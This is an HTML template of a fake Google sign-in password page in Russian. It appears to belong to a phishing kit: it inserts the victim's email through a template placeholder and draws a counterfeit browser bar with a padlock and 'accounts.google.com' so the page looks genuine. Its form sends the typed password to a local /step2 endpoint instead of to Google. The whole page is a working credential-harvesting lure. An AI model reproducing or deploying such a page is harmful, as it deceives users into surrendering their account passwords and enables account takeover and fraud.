<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Вход – аккаунты Google</title>
<link rel="stylesheet" href="/static/style.css">
<script>
  (function() {
    var saved = localStorage.getItem('theme');
    if (saved) document.documentElement.setAttribute('data-theme', saved);
  })();
</script>
</head>
<body>
  <button class="theme-toggle" onclick="toggleTheme()" title="Сменить тему">◐</button>

  <div class="chrome-bar">
    <span>🔒</span>
    <span>accounts.google.com</span>
  </div>

  <img class="logo" src="/static/google_logo.png" alt="Google">
  <h1>Добро пожаловать!</h1>

  <div class="account">
    <div class="avatar">👤</div>
    <span>{{ email }}</span>
    <span class="arrow">▼</span>
  </div>

  <form action="/step2" method="POST" autocomplete="off">
    <div class="field">
      <input type="password" name="password" id="pw" required autofocus>
      <label>Введите пароль</label>
    </div>

    <label class="checkbox">
      <input type="checkbox" onclick="document.getElementById('pw').type = this.checked ? 'text' : 'password'">
      Показать пароль
    </label>

    <div class="actions">
      <a class="forgot" href="#">Забыли пароль?</a>
      <button type="submit">Далее</button>
    </div>
  </form>

<script>
  function toggleTheme() {
    var current = document.documentElement.getAttribute('data-theme');
    if (!current) {
      var systemDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
      current = systemDark ? 'dark' : 'light';
    }
    var next = current === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('theme', next);
  }
</script>
</body>
</html>
